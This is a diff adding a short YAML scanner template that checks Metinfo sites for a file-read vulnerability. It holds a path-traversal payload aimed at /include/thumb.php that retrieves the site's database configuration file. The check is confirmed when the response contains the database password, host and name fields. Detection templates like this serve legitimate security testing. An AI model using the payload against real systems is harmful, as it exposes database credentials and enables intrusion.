@@ -1,0 +1,15 @@
+id: metinfo-file-read
+
+info:
+    name: Metinfo file read
+    author: amos1
+    severity: high
+
+rules:
+    r0:
+        request:
+            method: GET
+            path: /include/thumb.php?dir=http/.....///.....///config/config_db.php
+        expression: response.status == 200 && response.body.bcontains(b"con_db_pass") && response.body.bcontains(b"con_db_host") && response.body.bcontains(b"con_db_name")
+expression: r0()
+
